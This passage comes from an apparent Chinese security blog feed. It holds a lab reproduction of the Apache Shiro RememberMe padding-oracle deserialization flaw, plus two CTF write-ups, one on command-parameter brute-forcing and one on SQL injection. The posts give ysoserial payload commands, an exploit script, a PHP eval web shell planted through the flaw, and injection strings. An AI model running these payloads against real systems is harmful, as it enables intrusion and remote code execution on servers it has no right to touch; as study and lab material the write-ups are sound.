class="hljs routeros">vi /etc/profile<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">MAVEN_HOME</span>=/usr/local/apache-maven-3.6.3<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$MAVEN_HOME</span>/bin:$PATH <br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133359541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>进入父bash查看mvn版本</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/etc/</span>profile<br>mvn -v <br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133509501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">vim  <span class="hljs-meta-keyword">/usr/</span>local/apache-maven<span class="hljs-number">-3.6</span><span class="hljs-number">.3</span><span class="hljs-meta-keyword">/conf/</span>settings.xml<br>找到mirrors节点添加阿里镜像库地址：<br><span class="hljs-params">&lt;mirrors&gt;</span><br>    <span class="hljs-params">&lt;mirror&gt;</span><br>      <span class="hljs-params">&lt;id&gt;</span>alimaven<span class="hljs-params">&lt;/id&gt;</span><br>      <span class="hljs-params">&lt;name&gt;</span>aliyun maven<span class="hljs-params">&lt;/name&gt;</span><br>      <span class="hljs-params">&lt;url&gt;</span>http:<span class="hljs-comment">//maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;</span><br>      <span class="hljs-params">&lt;mirrorOf&gt;</span>central<span class="hljs-params">&lt;/mirrorOf&gt;</span>        <br>    <span class="hljs-params">&lt;/mirror&gt;</span><br>  <span class="hljs-params">&lt;/mirrors&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021062013361645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从 Apache Shiro Gtihub 官方仓库自行下载漏洞影响版本(<a href="https://github.com/apache/shiro)%EF%BC%8C%E4%BD%BF%E7%94%A8">https://github.com/apache/shiro)，使用</a> Apache Maven(软件项目管理及自动构建工具) 编译构建生成 war Java 应用程序包。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>shiro.git<br></code></pre></div></td></tr></table></figure><p>然后在执行</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> shiro<br><span class="hljs-attribute">git</span> checkout shiro-root-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>到这则搭建的没有问题<br><img src="https://img-blog.csdnimg.cn/20210620133711170.png" alt="在这里插入图片描述"></p><p>然后</p><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">cd</span> samples/web<br><span class="hljs-keyword">mvn</span> install<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133930385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将编译完成获取到的 samples-web-1.4.1.war 包( samples/target/中）拷贝到 Tomcat 的 webapps 目录下，启动tomcat即可。使用命令</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo docker cp 虚拟机里的war绝对路径 docker容器ID:<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/tomcat/</span>webapps<br></code></pre></div></td></tr></table></figure><p>然后打开http://自己虚拟机的IP:9000/samples-web-1.4.1/</p><p><img src="https://img-blog.csdnimg.cn/20210620134413592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="测试与结果"><a href="#测试与结果" class="headerlink" title="测试与结果"></a>测试与结果</h3><h4 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h4><h6 id="输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。"><a href="#输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。" class="headerlink" title="输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。"></a>输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。</h6><h6 id="使用RememberMe-cookie作为Padding-Oracle-Attack的前缀。"><a href="#使用RememberMe-cookie作为Padding-Oracle-Attack的前缀。" class="headerlink" title="使用RememberMe cookie作为Padding Oracle Attack的前缀。"></a>使用RememberMe cookie作为Padding Oracle Attack的前缀。</h6><h6 id="加密ysoserial的序列化有效负载，以通过Padding-Oracle-Attack制作精心制作的RememberMe。"><a href="#加密ysoserial的序列化有效负载，以通过Padding-Oracle-Attack制作精心制作的RememberMe。" class="headerlink" title="加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。"></a>加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。</h6><h6 id="请求带有新的RememberMe-cookie的网站，以执行反序列化攻击。"><a href="#请求带有新的RememberMe-cookie的网站，以执行反序列化攻击。" class="headerlink" title="请求带有新的RememberMe cookie的网站，以执行反序列化攻击。"></a>请求带有新的RememberMe cookie的网站，以执行反序列化攻击。</h6><h6 id="攻击者无需知道RememberMe加密的密码密钥。"><a href="#攻击者无需知道RememberMe加密的密码密钥。" class="headerlink" title="攻击者无需知道RememberMe加密的密码密钥。"></a>攻击者无需知道RememberMe加密的密码密钥。</h6><h4 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><h5 id="一-漏洞利用复现01"><a href="#一-漏洞利用复现01" class="headerlink" title="一.漏洞利用复现01"></a>一.漏洞利用复现01</h5><p>登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）：</p><p><img src="https://img-blog.csdnimg.cn/20210620184816156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>认证失败时（输入错误的用户名和密码），http响应页面中会显示出deleteMe的cookie:</p><p><img src="https://img-blog.csdnimg.cn/20210620185017886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入正确用户密码得到合法cookie：</p><p><img src="https://img-blog.csdnimg.cn/20210620190024434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>认证成功（输入正确的用户名和密码登录），http响应页面中不会显示deleteMe的cookie:</p><p><img src="https://img-blog.csdnimg.cn/202106201903079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用 Padding Oracle 构造我们自己的数据（Java序列化数据后的脏数据不影响反序列化结果），此时会有两中情况:</p><p>构造的数据不能通过字符填充验证，返回deleteme;<br>构造的数据可以成功解密通过字符填充验证，之后数据可以正常反序列化，不返回deleteme的cookie.<br>这里输入正确的用户名和密码，并勾选Remeber ME。</p><p>登录成功后，访问<a href="http://192.168.1.14:8080/account/%EF%BC%8CF12%E5%BE%97%E5%88%B0Cookie%E4%B8%AD%E7%9A%84rememberMe%E5%80%BC">http://192.168.1.14:8080/account/，F12得到Cookie中的rememberMe值</a><br><img src="https://img-blog.csdnimg.cn/20210620190609805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>使用Java反序列化工具 ysoserial 生成 Payload:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>  -jar ysoserial-master-<span class="hljs-number">6</span>eca<span class="hljs-number">5</span>bc<span class="hljs-number">740</span>-<span class="hljs-number">1</span>.jar   CommonsCollections<span class="hljs-number">1</span> &#x27;touch /tmp/test&#x27; &gt; payload.class<br></code></pre></div></td></tr></table></figure><p>通过git对其padding oracle attack  poc进行下载</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone  https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/wuppp/</span>shiro_rce_exp.git<br></code></pre></div></td></tr></table></figure><p>通过 Padding Oracle Attack 生成 Evil Rememberme cookie:<br>此 exp 爆破时间较长，建议使用 ysoserial 生成较短的 payload 验证（如： ping 、 touch /tmp/test等），生成成功后将自动停止运行。</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">也可用<span class="hljs-keyword">python</span>自动化脚本<br><span class="hljs-keyword">cp</span> payload.class  shiro_rce_exp/<br><span class="hljs-keyword">cd</span> shiro_rce_exp/<br><span class="hljs-keyword">python</span> shiro_exp.<span class="hljs-keyword">py</span> http://自己的ip:docker的端口/account/ 此处为上面获取Rememberme cookie payload.class<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210625224820201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210625224946755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用Evil Rememberme cookie 认证进行反序列化攻击：复制该cookie，然后重放一下数据，即可成功执行命令,此处脚本爆破出正确的Rememberme cookie需要较长时间。<br><img src="https://img-blog.csdnimg.cn/20210625225948360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>还可以用dnslog提供的dns地址解析来验证</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>  -jar ysoserial-master-<span class="hljs-number">6</span>eca<span class="hljs-number">5</span>bc<span class="hljs-number">740</span>-<span class="hljs-number">1</span>.jar CommonsBeanutils<span class="hljs-number">1</span> <span class="hljs-string">&quot;ping y2xqmm.dnslog.cn&quot;</span> &gt; payload.class<br></code></pre></div></td></tr></table></figure><h4 id="方法二使用shiro550-721漏洞检查工具对其进行验证"><a href="#方法二使用shiro550-721漏洞检查工具对其进行验证" class="headerlink" title="方法二使用shiro550/721漏洞检查工具对其进行验证"></a>方法二使用shiro550/721漏洞检查工具对其进行验证</h4><p>工具下载地址：<br><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/download/v2.51/ShiroExploit.V2.51.7z">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/download/v2.51/ShiroExploit.V2.51.7z</a></p><p><img src="https://img-blog.csdnimg.cn/20210626015025253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210626142410269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210626020227297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后有加号即存在漏洞</p><h4 id="提权shell"><a href="#提权shell" class="headerlink" title="提权shell"></a>提权shell</h4><p>生成payload然后用上述方法获取恶意rememberkey</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>  -jar ysoserial-master-d<span class="hljs-number">367</span>e<span class="hljs-number">379</span>d<span class="hljs-number">9</span>-<span class="hljs-number">1</span>.jar  CommonsCollections<span class="hljs-number">1</span> &#x27;touch /usr/local/tomcat/webapps/samples-web-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span>/<span class="hljs-number">1</span>.php&#x27; &gt; payload<span class="hljs-number">2</span>.class<br><br><span class="hljs-attribute">java</span>  -jar ysoserial-master-d<span class="hljs-number">367</span>e<span class="hljs-number">379</span>d<span class="hljs-number">9</span>-<span class="hljs-number">1</span>.jar  CommonsCollections<span class="hljs-number">1</span> &#x27;echo <span class="hljs-string">&quot;&lt;?php eval($_POST[&quot;</span>cmd<span class="hljs-string">&quot;]);&quot;</span> &gt; /usr/local/tomcat/webapps/samples-web-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span>/<span class="hljs-number">1</span>.php&#x27; &gt; payload<span class="hljs-number">2</span>.class<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210626141447776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>重放之后进入1.php可看到内容</p><p><img src="https://img-blog.csdnimg.cn/20210626142151449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后用蚁剑连接即可，或者直接shrio工具反弹shell</p><p><img src="https://img-blog.csdnimg.cn/20210626144042750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210626152005550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>Shiro</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu上强网杯高明的黑客</title>
    <link href="/2021/04/19/2021-4-19-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
    <url>/2021/04/19/2021-4-19-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="buu上强网杯高明的黑客"><a href="#buu上强网杯高明的黑客" class="headerlink" title="buu上强网杯高明的黑客"></a>buu上强网杯高明的黑客</h2><p><img src="https://img-blog.csdnimg.cn/20210419233615169.png" alt="在这里插入图片描述"><br>入题就是直接给了一个压缩包下载下来之后会发现是超级多的php代码有点像日志，打开后浏览一下就会发现很多post get参数，还有内敛执行命令，猜测可以利用某个参数来进行命令执行，思路很简单，这题考的应该就是脚本能力。<br><img src="https://img-blog.csdnimg.cn/20210419233751848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>代码如下，写脚本过程挺难受，也试过多线程但最后总是一些数据连在一起，目前还没解决，最后拿了大佬的脚本跑也没跑出来，下面的脚本还是用的笨方法，回头再研究一下多线程的问题吧。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>s = requests.session()<br>rootdir = <span class="hljs-string">&#x27;D:\pythonwp\\buuweb\强网杯\src&#x27;</span><br>file_list = os.listdir(rootdir)<br>useful_param = []<br>flag = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">file</span>):</span><br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">global</span> useful_param<br>    <span class="hljs-comment"># print(&quot;try&quot;)</span><br>    re_GETpayload = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,)<br>    re_POSTpayload = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>)<br>    path = os.path.join(rootdir, file)<br>    <span class="hljs-comment"># print(path)</span><br>    url = <span class="hljs-string">&#x27;http://93dec788-f1ac-4f32-99e4-943960f2f002.node3.buuoj.cn/&#x27;</span> + file<br>    <span class="hljs-built_in">print</span>(url)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-comment"># print(f.read())</span><br>        res = f.read()<br>        GET_param = re.findall(re_GETpayload,res)<br>        POST_param = re.findall(re_POSTpayload,res)<br>    <span class="hljs-keyword">if</span> file == <span class="hljs-string">&#x27;xk0SzyKwfzw.php&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(GET_param)<br>        <span class="hljs-built_in">print</span>(POST_param)<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(POST_param)):<br>        <span class="hljs-built_in">print</span>(POST_param[k])<br>        res_post = s.post(url=url, data=&#123;POST_param[k]: <span class="hljs-string">&#x27;echo hello&#x27;</span>&#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">in</span> res_post.text:<br>            <span class="hljs-comment"># useful_param.append(data)</span><br>            <span class="hljs-built_in">print</span>(POST_param[k])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok&quot;</span>)<br>            flag = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(GET_param)):<br>        payload = url + <span class="hljs-string">&quot;?&quot;</span> + GET_param[k] + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-string">&#x27;echo hello&#x27;</span><br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-comment"># print(data)</span><br>        res_get = s.get(url=payload)<br>        <span class="hljs-keyword">if</span> file == <span class="hljs-string">&#x27;xk0SzyKwfzw.php&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">in</span> res_get.text:<br>            <span class="hljs-comment"># useful_param.append(data)</span><br>            <span class="hljs-built_in">print</span>(GET_param[k])<br>            flag = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<span class="hljs-comment">#加入多线程</span><br>   <span class="hljs-comment"># t = threading.Thread(target=exp,args=(file_list[i],))</span><br>   <span class="hljs-comment"># t.start()</span><br>   exp(file_list[i])<br>   <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:<br>       <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210420003856335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>结果如上，可以发现可利用的php文件是xk0SzyKwfzw.php，参数为Efa5BVG，最后构造payload为Efa5BVG=cat /flag即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210420003924620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>buu刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUU</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU一道关于注入的题</title>
    <link href="/2021/04/18/2021-4-16-BUU%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E6%B3%A8%E5%85%A5%E7%9A%84%E9%A2%98/"/>
    <url>/2021/04/18/2021-4-16-BUU%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E6%B3%A8%E5%85%A5%E7%9A%84%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="BUU一道关于注入的题"><a href="#BUU一道关于注入的题" class="headerlink" title="BUU一道关于注入的题"></a>BUU一道关于注入的题</h2><p>特点：不同于一般的注入题，这题则需要你猜测后端的查询语句<br>入题随便输个数字页面如图<img src="https://img-blog.csdnimg.cn/20210201194521105.png" alt="在这里插入图片描述"><br>输入字符时无回显，先尝试了下简单的几个语句<img src="https://img-blog.csdnimg.cn/20210201194631904.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210201194854948.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210201194913481.png" alt="在这里插入图片描述"><br>猜测某些关键字被过滤，尝试输union,if,and等等发现都显示 Nonono<br>最后试了下堆叠注入<img src="https://img-blog.csdnimg.cn/20210201195116950.png" alt="在这里插入图片描述"><br> 终于有反应了，继续尝试准备查看字段名仍然显示Nonono<br> 在这里挣扎了许久，最后没办法了只有乖乖去看大佬的wp，确实超出了自己的知识范围</p><h4 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h4><p>这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用。最终可推测出内置的sql语句为</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">sql</span>=“select”.post[‘query’].<span class="hljs-string">&quot;||flag from Flag&quot;</span><span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>所以解法一：<br>如果$post[‘query’]的数据为*,1，sql语句就变成了</p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span>||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span><br></code></pre></div></td></tr></table></figure><p>也就是</p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span><br></code></pre></div></td></tr></table></figure><p>解法二：<br>输入</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">1;<span class="hljs-attribute">set_mode</span>=pips_as_concat;select 1<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201200415125.png" alt="在这里插入图片描述"><br>参考文章：<br><a href="https://blog.csdn.net/weixin_42373127/article/details/88866710">https://blog.csdn.net/weixin_42373127/article/details/88866710</a><br><a 